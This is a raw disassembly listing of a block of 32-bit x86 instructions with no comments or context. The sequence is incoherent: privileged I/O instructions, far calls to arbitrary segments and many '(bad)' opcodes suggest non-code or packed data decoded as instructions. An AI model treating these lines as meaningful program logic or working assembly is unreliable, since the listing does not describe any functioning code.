  422502:	dec    esp
  422503:	shl    BYTE PTR [edx],cl
  422505:	dec    edx
  422506:	and    eax,0x4e7ef6ce
  42250b:	and    esp,DWORD PTR [ebx]
  42250d:	popa   
  42250e:	and    bh,BYTE PTR [edi+0x334a5632]
  422514:	and    al,0x78
  422516:	dec    esi
  422517:	out    dx,al
  422518:	mov    ebp,0x93c7f4f5
  42251d:	mov    dl,0x2b
  42251f:	bound  ecx,QWORD PTR [ebp+0x76]
  422522:	les    ebp,FWORD PTR [eax-0x58]
  422525:	ret    0x8301
  422528:	ror    edi,1
  42252a:	add    DWORD PTR [esi],edi
  42252c:	int    0xa5
  42252e:	xlat   BYTE PTR ds:[ebx]
  42252f:	xchg   esp,eax
  422530:	xor    BYTE PTR [ecx+0x10228ec],0x26
  422537:	fidiv  WORD PTR [edi]
  422539:	adc    ah,BYTE PTR [edx]
  42253b:	adc    bl,BYTE PTR [edx+0x47c21c78]
  422541:	cmp    dh,dl
  422543:	sbb    ebp,DWORD PTR [ebx+0x66cd2f2]
  422549:	add    DWORD PTR [esi],edi
  42254b:	jle    0x4225ae
  42254d:	xchg   DWORD PTR [eax+0x406013e3],esp
  422553:	cmp    BYTE PTR [eax+0x1],0xb3
  422557:	hlt    
  422558:	adc    dl,BYTE PTR [ecx-0x62]
  42255b:	mov    esp,0xbb11d84c
  422560:	push   ecx
  422561:	dec    edi
  422562:	int    0x92
  422564:	jp     0x4225b0
  422566:	and    BYTE PTR [edx+0x41b186c9],dh
  42256c:	in     al,0x36
  42256e:	loopne 0x4225e2
  422570:	aad    0x5f
  422572:	cdq    
  422573:	dec    esi
  422574:	xor    al,0xa1
  422576:	call   0x7734:0x96da7eef
  42257d:	adc    bh,al
  42257f:	cs pop eax
  422581:	mov    ss,WORD PTR [eax-0x7c]
  422584:	mov    BYTE PTR [eax],0x4a
  422587:	rol    edi,cl
  422589:	xor    ah,dh
  42258b:	pop    es
  42258c:	outs   dx,DWORD PTR ds:[esi]
  42258d:	fcomp  st(6)
  42258f:	pushf  
  422590:	aaa    
  422591:	out    dx,eax
  422592:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422594:	xchg   edx,eax
  422595:	imul   edx,edi,0xffffffcc
  422598:	dec    esp
  422599:	jle    0x42252e
  42259b:	pop    esi
  42259c:	outs   dx,BYTE PTR ds:[esi]
  42259d:	xlat   BYTE PTR ds:[ebx]
  42259e:	or     dh,cl
  4225a0:	ins    BYTE PTR es:[edi],dx
  4225a1:	nop
  4225a2:	cmp    cl,0x99
  4225a5:	inc    edx
  4225a6:	cdq    
  4225a7:	loope  0x42252a
  4225a9:	adc    cl,BYTE PTR [edi-0x4fe94e66]
  4225af:	addr16 (bad) 
  4225b1:	ins    DWORD PTR es:[edi],dx
  4225b2:	or     BYTE PTR [edx-0x6d],dh
  4225b5:	leave  
  4225b6:	add    DWORD PTR [ebp+edx*2+0x6d],ecx
  4225ba:	fs ins BYTE PTR es:[edi],dx
  4225bc:	shr    DWORD PTR [ebp-0x66dc2f34],0xab
  4225c3:	leave  
  4225c4:	sbb    DWORD PTR [ecx+0x22],edx
  4225c7:	into   
  4225c8:	sub    al,0x3c
  4225ca:	xchg   esp,eax
  4225cb:	mul    DWORD PTR [edx+0x751eb5ea]
  4225d1:	inc    ecx
  4225d2:	push   edx
  4225d3:	test   esp,esi
  4225d5:	mov    edx,0xe362da3e
  4225da:	sub    eax,0x41b3213a
  4225df:	les    eax,FWORD PTR [edx+0x2b]
  4225e2:	leave  
  4225e3:	test   eax,0xcddf7999
  4225e8:	mov    bl,0xbc
  4225ea:	add    al,0x42
  4225ec:	push   edx
  4225ed:	div    BYTE PTR [ebp-0x51]
  4225f0:	pop    edi
  4225f1:	icebp  
  4225f2:	lds    edx,FWORD PTR [ecx-0x35]
  4225f5:	inc    esp
  4225f6:	bnd ja 0x422643
  4225f9:	sub    ebp,DWORD PTR [esi-0x1dea17bf]
  4225ff:	cwde   
  422600:	cld    
  422601:	inc    esp
  422602:	add    dh,BYTE PTR [edi+0x47]
  422605:	lods   al,BYTE PTR ds:[esi]
  422606:	xor    DWORD PTR fs:[edx],ecx
  422609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42260a:	or     edx,ebp
  42260c:	xchg   edi,eax
  42260d:	(bad)  
  42260e:	push   ebx
  42260f:	and    al,0x1c
  422611:	or     ah,ch
  422613:	push   ebp
  422614:	inc    edx
  422615:	fstp   TBYTE PTR [esi+0x3b]
  422618:	pop    esi
  422619:	and    al,0x33
  42261b:	push   ss
  42261c:	add    BYTE PTR [esi],cl
  42261e:	lods   eax,DWORD PTR ds:[esi]
  42261f:	pop    ecx
  422620:	out    0xfa,al
  422622:	loope  0x42264e
  422624:	fist   DWORD PTR fs:[ecx-0x2c]
  422628:	push   ecx
  422629:	push   eax
  42262a:	(bad)
  42262e:	mov    cl,0xba
  422630:	mov    dl,0x18
  422632:	call   0xba6f:0x4502965c
  422639:	outs   dx,DWORD PTR ds:[esi]
  42263a:	or     BYTE PTR [ecx+0x5a19c26c],ah
  422640:	and    DWORD PTR [edx+0x718fb1b2],0x3230871b
  42264a:	adc    BYTE PTR [ecx],cl
  42264c:	add    eax,0xddf1e73b
  422651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422652:	jno    0x4226bd
  422654:	xor    esi,DWORD PTR [ebx]
  422656:	test   eax,0xc431cefe
  42265b:	imul   ebp,DWORD PTR [ebp+0xe994c1],0x60
  422662:	mov    ah,0x95
  422664:	ja     0x422644
  422666:	jno    0x42260a
  422668:	mov    edi,0xe8fd4a71
  42266d:	aam    0x6b
  42266f:	loop   0x4226c1
  422671:	pop    esp
  422672:	jmp    0xb0f878ae
  422677:	into   
  422678:	cmp    BYTE PTR [ebx-0xa49e664],dh
  42267e:	pop    edi
  42267f:	cmp    DWORD PTR [ebp*2-0x5f353f26],edi
  422686:	dec    esp
  422687:	add    ecx,DWORD PTR [eax-0x4281eaf6]
  42268d:	ja     0x422709
  42268f:	adc    al,0x9a
  422691:	aaa    
  422692:	sbb    al,0x2d
  422694:	xor    eax,0xe2e5b1a0
  422699:	xor    bl,BYTE PTR [edx]
  42269b:	sbb    al,0xd9
  42269d:	loopne 0x422713
  42269f:	fstp   TBYTE PTR ss:[edx-0x42914ede]
  4226a6:	test   DWORD PTR [ecx-0x1c2a8d83],eax
  4226ac:	rcr    cl,0x3b
  4226af:	xor    dh,BYTE PTR gs:[ebx-0x1cd1b5f6]
  4226b6:	jb     0x4226d4
  4226b8:	pop    di
  4226ba:	dec    edx
  4226bb:	ficom  WORD PTR [esi-0x586726b1]
  4226c1:	jns    0x4226f5
  4226c3:	test   al,0xdd
  4226c5:	pop    ebx
  4226c6:	cs mov ecx,0xf8961ccb
  4226cc:	shl    DWORD PTR [edx+0x61],0xaf
  4226d0:	int    0xf7
  4226d2:	mov    esi,0xfc4e5f3d
  4226d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d8:	sub    cl,BYTE PTR ds:[ebx-0x600be26]
  4226df:	xchg   edi,eax
  4226e0:	retf   0x2ea4
  4226e3:	inc    ecx
  4226e4:	pop    esi
  4226e5:	mov    bl,0x90
  4226e7:	shl    DWORD PTR [esi],0xc9
  4226ea:	dec    edx
  4226eb:	outs   dx,DWORD PTR ds:[esi]
  4226ec:	sub    BYTE PTR [edi+0x4b],ah
  4226ef:	push   0x600bde56
  4226f4:	add    ah,cl
  4226f6:	adc    dh,bh
  4226f8:	mov    al,ds:0xe1a99360
  4226fd:	and    al,dh
  4226ff:	push   0x402e7449
  422704:	jnp    0x422776
  422706:	sub    eax,0x77eca81b
  42270b:	or     DWORD PTR [ecx+ebp*4+0x5d],ecx
  42270f:	mov    bl,0x67
  422711:	pop    ecx
  422712:	shl    DWORD PTR [edi],1
  422714:	xchg   ebx,eax
  422715:	xor    eax,0xedf2877f
  42271a:	xchg   edi,eax
  42271b:	mov    ecx,0xb4e3f5ab
  422720:	imul   edx,DWORD PTR [eax+0x7bdac6a3],0x1f
  422727:	jmp    0xd372:0xc8100cbd
  42272e:	in     eax,0xb6
  422730:	add    DWORD PTR [ecx+0x23],edx
  422733:	jne    0x422760
  422735:	sbb    al,0xf9
  422737:	push   esi
  422738:	stos   DWORD PTR es:[edi],eax
  422739:	aad    0x2
  42273b:	ficom  WORD PTR gs:[edx]
  42273e:	test   DWORD PTR [edi],ebx
  422740:	into   
  422741:	popf   
  422742:	(bad)  
  422744:	dec    ebx
  422745:	les    edi,FWORD PTR [ebx+0x73251067]
  42274b:	adc    bh,bh
  42274d:	fucomp st(6)
  42274f:	and    BYTE PTR [ebp-0x17],dh
  422752:	iret   
  422753:	mov    ds:0xa941870a,al
  422758:	cli    
  422759:	xchg   BYTE PTR [ecx],dh
  42275b:	xchg   DWORD PTR [ebx-0x12],ecx
  42275e:	call   DWORD PTR [ecx+0x2b]
  422761:	call   0x5382:0x3899c93
  422768:	and    eax,0x8111bd8b
  42276d:	and    BYTE PTR [edx-0x47f3ed8f],dh
  422773:	imul   ebx,DWORD PTR [ebx],0x6f3d8061
  422779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42277a:	fisttp QWORD PTR [ecx+0x6ba0f188]
  422780:	push   eax
  422781:	sub    ebp,edi
  422783:	popf   
  422784:	call   0xd70:0x1acaca15
  42278b:	popf   
  42278c:	(bad)  
  42278d:	xchg   esi,eax
  42278e:	gs jnp 0x422760
  422791:	sbb    eax,0xb8b0388
  422796:	in     al,0x7c
  422798:	int3   
  422799:	mov    WORD PTR [esi+0x68],cs
  42279c:	xlat   BYTE PTR ds:[ebx]
  42279d:	xchg   esp,eax
  42279e:	jecxz  0x4227b0
  4227a0:	and    al,0xc8
  4227a2:	xor    BYTE PTR [ebx+0x3f0677f7],0xbc
  4227a9:	sub    BYTE PTR [edx-0x5b284b78],0xe5
  4227b0:	call   0xd261b6b
  4227b5:	(bad)  
  4227b6:	ror    ah,1
  4227b8:	mov    al,0x9f
  4227ba:	or     al,0x3e
  4227bc:	push   ss
  4227bd:	inc    edx
  4227be:	jne    0x422808
  4227c0:	sbb    eax,0x6f4684f5
  4227c5:	mov    dl,0xf4
  4227c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227c8:	cli    
  4227c9:	jnp    0x422817
  4227cb:	fld    DWORD PTR [edx-0x6c]
  4227ce:	pop    ds
  4227cf:	mov    dh,0x54
  4227d1:	cmp    bh,al
  4227d3:	call   0xfe96:0xb21c0431
  4227da:	sar    ah,0xe3
  4227dd:	into   
  4227de:	xlat   BYTE PTR ds:[ebx]
  4227df:	cmp    dl,BYTE PTR [eax+0x2d]
  4227e2:	(bad)  
  4227e3:	lods   al,BYTE PTR ds:[esi]
  4227e4:	(bad)  
  4227e5:	das    
  4227e6:	into   
  4227e7:	mov    ds:0xc491e8f6,al
  4227ec:	test   esi,esi
  4227ee:	jno    0x4227bf
  4227f0:	clc    
  4227f1:	ficomp WORD PTR [ecx-0xcb6b4a]
  4227f7:	out    dx,eax
  4227f8:	nop
  4227f9:	push   edi
  4227fa:	int    0x47
  4227fc:	jns    0x422832
  4227fe:	mov    esi,0x73e82cc2
  422803:	adc    dh,BYTE PTR [ecx+0x67]
  422806:	xchg   edi,eax
  422807:	mov    ds:0xfa70691c,al
  42280c:	cmp    DWORD PTR [ecx-0xf5e1b56],edi
  422812:	xchg   ecx,eax
  422813:	outs   dx,BYTE PTR ds:[esi]
  422814:	sub    DWORD PTR [ebp-0x58],edx
  422817:	lods   eax,DWORD PTR ds:[esi]
  422818:	jno    0x422801
  42281a:	mov    WORD PTR [edx+0xaf697cf],ss
  422820:	clc    
  422821:	ins    BYTE PTR es:[edi],dx
  422822:	or     bl,dh
  422824:	scas   al,BYTE PTR es:[edi]
  422825:	rcl    DWORD PTR [ecx],1
  422827:	sahf   
  422828:	add    ah,0x8f
  42282b:	cmp    ebp,DWORD PTR [edi]
  42282d:	adc    eax,0x95ce5e43
  422832:	test   al,0x37
  422834:	jne    0x4228a5
  422836:	popa   
  422837:	jne    0x4227e5
  422839:	cmp    al,dl
  42283b:	mov    WORD PTR [eax+0x1],es
  42283e:	push   0xffffff84
  422840:	dec    edx
  422841:	dec    esp
  422842:	cmp    DWORD PTR [ebx+0x9],ecx
  422845:	sub    al,0x1e
  422847:	push   cs
  422848:	fcmovnbe st,st(2)
  42284a:	add    eax,0x9fbb1f5d
  42284f:	sub    BYTE PTR [edi],cl
  422851:	cmp    BYTE PTR [ebp+0x211058b],cl
  422857:	xor    eax,0x71739f28
  42285c:	repnz mov ah,0xe9
  42285f:	mov    ds:0x946c3f4a,al
  422864:	aam    0x3b
  422866:	inc    esi
  422867:	mov    DWORD PTR [eax+0x3a840f5a],eax
  42286d:	sbb    dh,ch
  42286f:	and    ecx,DWORD PTR [ebp-0x3a]
  422872:	jg     0x422888
  422874:	into   
  422875:	mov    ebx,0x841d7e91
  42287a:	faddp  st(7),st
  42287c:	sub    dl,BYTE PTR [edx-0xb]
  42287f:	xchg   edx,eax
  422880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422881:	dec    DWORD PTR [edi-0x40]
  422884:	sbb    ebp,ebx
  422886:	(bad)  
  422887:	out    dx,eax
  422888:	adc    DWORD PTR [edi+0xafa023e],ebx
  42288e:	mov    bl,0x6
  422890:	(bad)
  422894:	call   0xc9946c09
  422899:	jo     0x422872
  42289b:	dec    esp
  42289c:	sar    DWORD PTR [eax+ebx*1+0x444e4778],cl
  4228a3:	(bad)  
  4228a4:	out    0xa2,eax
  4228a6:	push   edi
  4228a7:	ss push edi
  4228a9:	cmp    eax,0xcdc4d8de
  4228ae:	sub    eax,0xb03ee7db
  4228b3:	leave  
  4228b4:	fdivr  st(3),st
  4228b6:	icebp  
  4228b7:	pushf  
  4228b8:	aaa    
  4228b9:	jo     0x4228db
  4228bb:	js     0x422937
  4228bd:	test   DWORD PTR [ecx+0x28],edi
  4228c0:	push   0x57
  4228c2:	(bad)  
  4228c3:	and    bh,al
  4228c5:	mov    al,0xda
  4228c7:	add    eax,0xd99b7982
  4228cc:	pop    es
  4228cd:	dec    eax
  4228ce:	mov    esi,0x728f6963
  4228d3:	mov    ecx,0xd5a5c63b
  4228d8:	sbb    BYTE PTR [ebp-0x6],0xe5
  4228dc:	sar    DWORD PTR [edx+0x35f00768],0x92
  4228e3:	push   esi
  4228e4:	add    BYTE PTR [eax],ch
  4228e6:	ficomp WORD PTR [ebx-0x4b]
  4228e9:	outs   dx,DWORD PTR ds:[esi]
  4228ea:	or     eax,0xb7384abc
  4228ef:	data16 mov bh,ah
  4228f2:	popf   
  4228f3:	das    
  4228f4:	aas    
  4228f5:	add    eax,0x71656185
  4228fa:	arpl   WORD PTR [esi],di
  4228fc:	leave  
  4228fd:	dec    esi
  4228fe:	adc    bh,0x76
  422901:	ss sbb eax,0x5584ff8e
  422907:	add    DWORD PTR [ebp+0x18],0x6b
  42290b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42290c:	ins    DWORD PTR es:[edi],dx
  42290d:	and    bh,dl
  42290f:	mov    esi,0x134c0558
  422914:	dec    ebp
  422915:	cli    
  422916:	jge    0x422979
  422918:	(bad)  
  422919:	sub    edx,DWORD PTR [esi]
  42291b:	or     BYTE PTR [ecx-0x63],ch
  42291e:	hlt    
  42291f:	iret   
  422920:	jecxz  0x4228c7
  422922:	cmp    eax,0xbbd95342
  422927:	fst    DWORD PTR [esi]
  422929:	leave  
  42292a:	mov    eax,0x319c4c19
  42292f:	or     BYTE PTR [edi-0x2d],cl
  422932:	cmp    eax,0x54d75489
  422937:	jge    0x422979
  422939:	dec    esp
  42293a:	stos   BYTE PTR es:[edi],al
  42293b:	sub    ecx,esp
  42293d:	ja     0x4228d0
  42293f:	mov    dl,0x1c
  422941:	test   eax,0x4b5429d0
  422946:	imul   esp,DWORD PTR [ebp+0x14abea0a],0xffffff92
  42294d:	mov    cl,0x5c
  42294f:	jp     0x4229b3
  422951:	ds (bad) 
  422953:	push   edi
  422954:	addr16 test eax,0x83998c4a
  42295a:	add    BYTE PTR [esi+0x57],cl
  42295d:	out    dx,al
  42295e:	cmp    DWORD PTR [esp+eax*2],eax
  422961:	xor    BYTE PTR [ebp+0x18],0x38
  422965:	fist   WORD PTR [ebp-0x24]
  422968:	test   BYTE PTR [ebx+edx*2],ch
  42296b:	mov    al,0xd1
  42296d:	jmp    0xd04a957
  422972:	jns    0x422946
  422974:	sub    dh,BYTE PTR [eax+0x2b00160e]
  42297a:	gs and al,0x90
  42297d:	sbb    esp,DWORD PTR [eax]
  42297f:	pop    ebx
  422980:	outs   dx,DWORD PTR ds:[esi]
  422981:	in     eax,dx
  422982:	fs sub eax,0x441ea07c
  422988:	or     BYTE PTR [ebp+ebp*8+0x1f],ch
  42298c:	mov    ebx,0x4f8d8bb1
  422991:	add    cl,BYTE PTR [ecx+ebp*1]
  422994:	adc    bl,BYTE PTR [edx]
  422996:	int3   
  422997:	push   ecx
  422998:	add    eax,0x76b3a78c
  42299d:	lods   al,BYTE PTR ds:[esi]
  42299e:	pop    edi
  42299f:	inc    ebx
  4229a0:	pop    esp
  4229a1:	mov    ds:0x9d37e5d9,al
  4229a6:	pushf  
  4229a7:	loopne 0x4229ac
  4229a9:	adc    BYTE PTR [ecx+edi*1],0xb5
  4229ad:	and    DWORD PTR [edi+edi*4+0x4d64a115],0x21d3ae74
  4229b8:	jno    0x422989
  4229ba:	int3   
  4229bb:	xor    ecx,DWORD PTR ds:0x214d6618
  4229c1:	xchg   esp,eax
  4229c2:	(bad)  [eax+0x6a]
  4229c5:	shl    ch,1
  4229c7:	sub    DWORD PTR [edi],0xffffffeb
  4229ca:	nop
  4229cb:	adc    DWORD PTR [ecx],ebp
  4229cd:	fwait
  4229ce:	les    ebp,FWORD PTR [ecx+0x28]
  4229d1:	imul   esi,DWORD PTR [edi],0x11
  4229d4:	xchg   ebp,eax
  4229d5:	call   0xff3b:0x9321994a
  4229dc:	imul   eax,DWORD PTR [eax],0xffffffd4
  4229df:	mov    bh,0xff
  4229e1:	stc    
  4229e2:	hlt    
  4229e3:	push   edi
  4229e4:	loopne 0x4229e3
  4229e6:	retf   
  4229e7:	imul   edx,ebx,0x5ae688ab
  4229ed:	out    0xd3,eax
  4229ef:	dec    esi
  4229f0:	sub    BYTE PTR [edi+0x51],ah
  4229f3:	bnd jnp 0x422a04
  4229f6:	je     0x42297f
  4229f8:	(bad)  
  4229f9:	outs   dx,BYTE PTR ds:[esi]
  4229fa:	ja     0x4229ec
  4229fc:	sbb    edx,DWORD PTR [ebx+0x2854d638]
  422a02:	xor    BYTE PTR [ecx+ebx*4],bh
  422a05:	sbb    eax,0x6fbbfa65
  422a0a:	js     0x4229c6
  422a0c:	mov    ecx,0x8128aaed
  422a11:	pop    ds
  422a12:	inc    edx
  422a13:	js     0x4229aa
  422a15:	cmp    al,0xed
  422a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a18:	ss repnz push cs
  422a1b:	in     al,dx
  422a1c:	in     eax,dx
  422a1d:	mov    ?,edx
  422a1f:	sub    edx,DWORD PTR [ebx+0x3406d0b6]
  422a25:	cmp    esp,esi
  422a27:	xchg   esi,eax
  422a28:	sbb    esi,DWORD PTR [esi+esi*2+0x6ccc2e96]
  422a2f:	sub    eax,0x994e5953
  422a34:	mov    ebp,DWORD PTR [ecx]
  422a36:	mov    esp,0x49d4e02c
  422a3b:	test   eax,0xcd2b75fb
  422a40:	jns    0x422a0b
  422a42:	in     al,dx
  422a43:	or     DWORD PTR [edx+edx*2],eax
  422a46:	and    DWORD PTR [ebx],0x5b
  422a49:	mov    ebp,0x1d0160a3
  422a4e:	sbb    BYTE PTR [edi-0x6ad3e5a0],dl
  422a54:	adc    al,0x73
  422a56:	mov    ebp,0x82482f1d
  422a5b:	inc    ecx
  422a5c:	inc    esp
  422a5d:	jo     0x422ada
  422a5f:	inc    esi
  422a60:	cld    
  422a61:	rcr    dl,1
  422a63:	pushf  
  422a64:	or     dh,BYTE PTR [edi-0x46fe45e7]
  422a6a:	add    eax,0x20c9d470
  422a6f:	pusha  
  422a70:	pop    ecx
  422a71:	cmp    eax,0xe82d8a88
  422a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a77:	mov    ds:0x119fc6a0,al
  422a7c:	inc    ebx
  422a7d:	mov    ds:0xefc2c7ca,al
  422a82:	(bad)  
  422a84:	test   bh,bl
  422a86:	inc    esp
  422a87:	rcl    DWORD PTR [eax+0x4e369945],1
  422a8d:	pop    esi
  422a8e:	dec    esi
  422a8f:	cs inc ebx
  422a91:	dec    ebx
  422a92:	xchg   edx,eax
  422a93:	add    al,0x2e
  422a95:	lods   eax,DWORD PTR ds:[esi]
  422a96:	add    BYTE PTR [esi-0x30ce43e3],ch
  422a9c:	mov    cl,0xda
  422a9e:	popa   
  422a9f:	scas   al,BYTE PTR es:[edi]
  422aa0:	lds    edi,FWORD PTR [edi+0x507946dc]
  422aa6:	out    0x66,eax
  422aa8:	das    
  422aa9:	retf   
  422aaa:	mov    esi,0x3ba55e46
  422aaf:	inc    esi
  422ab0:	xor    edx,0xffffffd1
  422ab3:	(bad)  
  422ab4:	mov    ds:0xd7f75b3a,al
  422ab9:	sub    dh,al
  422abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422abc:	push   esp
  422abd:	(bad)  
  422abe:	mov    ebp,0x644e6d6f
  422ac3:	adc    bh,BYTE PTR [edx+ecx*8+0x3e3653fc]
  422aca:	imul   ebx,DWORD PTR [eax],0x58
  422acd:	jp     0x422aca
  422acf:	jp     0x422b4a
  422ad1:	mov    esi,0x6bbe8acc
  422ad6:	shl    eax,cl
  422ad8:	nop
  422ad9:	xchg   BYTE PTR [esi+edx*4+0x23],bl
  422add:	stos   BYTE PTR es:[edi],al
  422ade:	push   eax
  422adf:	xchg   edx,eax
  422ae0:	push   ds
  422ae1:	mov    esp,0x64c3ecc8
  422ae6:	jns    0x422b4a
  422ae8:	xlat   BYTE PTR ds:[ebx]
  422ae9:	fcmovb st,st(4)
  422aeb:	add    eax,DWORD PTR [ecx]
  422aed:	stos   BYTE PTR es:[edi],al
  422aee:	sub    ch,BYTE PTR [eax-0x26f506e2]
  422af4:	cli    
  422af5:	aas    
  422af6:	std    
  422af7:	imul   ebp,DWORD PTR gs:[edx+0x29e4799e],0xffffff85
  422aff:	push   es
  422b00:	xchg   ebp,eax
  422b01:	xor    BYTE PTR [ebx+0x7],cl
  422b04:	imul   ebp
  422b06:	popf   
  422b07:	popa   
  422b08:	xchg   edi,eax
  422b09:	pop    ebp
  422b0a:	add    al,BYTE PTR [esp+esi*2]
  422b0d:	mov    eax,0x35ded0f5
  422b12:	sub    DWORD PTR [eax-0x3ad62c0f],0x5c
  422b19:	cli    
  422b1a:	xchg   edi,eax
  422b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b1c:	imul   edx,DWORD PTR [ebx+0x7b38a6cc],0x60
  422b23:	mov    WORD PTR [ecx-0xa],cs
  422b26:	add    al,0x25
  422b28:	push   ebp
  422b29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b2a:	ja     0x422ba5
  422b2c:	cli    
  422b2d:	add    DWORD PTR [esi],ebp
  422b2f:	and    al,0x94
  422b31:	js     0x422b17
  422b33:	xchg   ebx,eax
  422b34:	dec    ebp
  422b35:	pop    ss
  422b36:	arpl   bp,bp
  422b38:	iret   
  422b39:	jno    0x422bb1
  422b3b:	xchg   edi,eax
  422b3c:	xor    al,0xfa
  422b3e:	inc    ecx
  422b3f:	jp     0x422ae3
  422b41:	xor    eax,esp
  422b43:	dec    esp
  422b44:	scas   eax,DWORD PTR es:[edi]
  422b45:	push   0xbb925611
  422b4a:	lahf   
  422b4b:	xlat   BYTE PTR ds:[ebx]
  422b4c:	icebp  
  422b4d:	loopne 0x422bb5
  422b4f:	inc    esi
  422b50:	daa    
  422b51:	xlat   BYTE PTR ds:[ebx]
  422b52:	mov    dh,0xbd
  422b54:	mov    esi,0x9c9f106
  422b59:	ret    
  422b5a:	nop
  422b5b:	maskmovq mm1,mm1
  422b5e:	scas   al,BYTE PTR es:[edi]
  422b5f:	sub    DWORD PTR [edi-0x15836d1d],edx
  422b65:	or     al,0x40
  422b67:	inc    esp
  422b68:	mov    ebx,esi
  422b6a:	adc    ecx,esi
  422b6c:	icebp  
  422b6d:	mov    ecx,0xe315b42d
  422b72:	dec    esi
  422b73:	pop    ebx
  422b74:	lahf   
  422b75:	or     BYTE PTR [edi],dl
  422b77:	cld    
  422b78:	test   dl,ah
  422b7a:	add    eax,DWORD PTR [ecx-0x4dfcd1b9]
  422b80:	(bad)  
  422b81:	les    edi,FWORD PTR [ebp-0x45]
  422b84:	add    eax,0xd73f6fb4
  422b89:	and    DWORD PTR [eax],0x8
  422b8c:	add    DWORD PTR [ebx+0x25],0x98b15a39
  422b93:	adc    BYTE PTR [esi+0x50],ch
  422b96:	int    0x96
  422b98:	push   esp
  422b99:	or     eax,DWORD PTR [edx-0x3f]
  422b9c:	(bad)
  422b9f:	sub    edi,DWORD PTR [ecx]
  422ba1:	dec    eax
  422ba2:	add    ecx,esi
  422ba4:	add    bl,BYTE PTR [ecx-0x79]
  422ba7:	inc    esi
  422ba8:	and    eax,0xfb0e3c03
  422bad:	stos   BYTE PTR es:[edi],al
  422bae:	add    DWORD PTR [edi+0x4600cdf1],0xbf01b73b
  422bb8:	push   0x7e
  422bba:	leave  
  422bbb:	adc    eax,0x1edacfe1
  422bc0:	fnstsw WORD PTR [edi+edx*2]
  422bc3:	out    0xe1,eax
  422bc5:	cmp    DWORD PTR [edi+0x1a20807f],edi
  422bcb:	repz rcl BYTE PTR [edi+0x78d4e156],0x4
  422bd3:	enter  0xa8fd,0x1c
  422bd7:	test   BYTE PTR [ecx],bh
  422bd9:	gs mov ebp,0x61abf07
  422bdf:	aad    0x54
  422be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422be2:	(bad)  
  422be3:	(bad)  
  422be4:	ret    
  422be5:	test   BYTE PTR [esi-0x2a9a5d74],ch
  422beb:	popf   
  422bec:	adc    al,0xcb
  422bee:	or     edx,ebx
  422bf0:	mov    ds:0x5e6a6b87,al
  422bf5:	lock out dx,eax
  422bf7:	inc    edx
  422bf8:	mov    esi,0xaf1e4093
  422bfd:	pop    eax
  422bfe:	js     0x422c1e
  422c00:	fisttp DWORD PTR [ecx+0x12fe49d7]
  422c06:	div    esp
  422c08:	lahf   
  422c09:	inc    ecx
  422c0a:	fwait
  422c0b:	pop    ss
  422c0c:	add    BYTE PTR [edi+ecx*1],dl
  422c0f:	add    DWORD PTR [ebx-0x7d02cb17],eax
  422c15:	mov    esp,esp
  422c17:	jge    0x422c85
  422c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c1a:	in     al,0x4a
  422c1c:	mov    dl,0x69
  422c1e:	xchg   edx,eax
  422c1f:	jmp    0x422c26
  422c21:	xchg   edx,eax
  422c22:	pop    esp
  422c23:	add    eax,0x45a310dd
  422c28:	mov    al,ds:0xc79ea47c
  422c2d:	addr16 sbb eax,0x7a1d5d91
  422c33:	stc    
  422c34:	rol    ebp,1
  422c36:	out    dx,eax
  422c37:	aaa    
  422c38:	xchg   edx,eax
  422c39:	mov    ebx,0xd198c76d
  422c3e:	mov    dl,0xf8
  422c40:	nop
  422c41:	out    dx,eax
  422c42:	jp     0x422c2e
  422c44:	xchg   ecx,eax
  422c45:	mov    bh,0xd
  422c47:	leave  
  422c48:	mov    edx,0xd147525c
  422c4d:	cwde   
  422c4e:	mov    cl,0x15
  422c50:	mov    BYTE PTR [ecx+0x33064d11],bl
  422c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c57:	mov    ds:0x916c48ca,al
  422c5c:	push   esi
  422c5d:	add    eax,0x73e6a8b6
  422c62:	bound  edi,QWORD PTR [edi]
  422c64:	add    DWORD PTR [eax],eax
  422c66:	ss push esp
  422c68:	mov    ecx,0x8d8befc8
  422c6d:	in     al,dx
  422c6e:	pushf  
  422c6f:	jno    0x422c57
  422c71:	setae  BYTE PTR ss:[edi-0x730f0a1b]
  422c79:	(bad)  
  422c7a:	mov    esp,0xb3fd12b0
  422c7f:	or     BYTE PTR [ecx],ah
  422c81:	stc    
  422c82:	test   DWORD PTR [esi],esp
  422c84:	sbb    ah,BYTE PTR ss:[edx+0x660b8773]
  422c8b:	in     eax,dx
  422c8c:	mov    ds,WORD PTR [ecx+eax*2]
  422c8f:	pop    ss
  422c90:	dec    ebp
  422c91:	inc    ecx
  422c92:	mov    esi,0xbfe7e50b
  422c97:	sti    
  422c98:	test   eax,0x4427af92
  422c9d:	jl     0x422c3b
  422c9f:	popf   
  422ca0:	std    
  422ca1:	arpl   WORD PTR [edi+esi*1],di
  422ca4:	pop    ds
  422ca5:	inc    esi
  422ca6:	iret   
  422ca7:	stc    
  422ca8:	scas   al,BYTE PTR es:[edi]
  422ca9:	cs pop ecx
  422cab:	cmp    dh,BYTE PTR [ebx-0x1c43b0f1]
  422cb1:	mov    ds:0xfd505b78,eax
  422cb6:	sbb    eax,0xc1311d4e
  422cbb:	xchg   edx,eax
  422cbc:	mov    ecx,0x325585c
  422cc1:	mov    dh,0xd9
  422cc3:	cmp    ecx,ebx
  422cc5:	imul   esi,esp,0xffffff8d
  422cc8:	retf   0xf55e
  422ccb:	cwde   
  422ccc:	loope  0x422cdd
  422cce:	push   cs
  422ccf:	adc    al,BYTE PTR [eax+0x5f]
  422cd2:	imul   esp,DWORD PTR [ebx+0x9],0xffffff8d
  422cd6:	arpl   WORD PTR [esi-0x7a],di
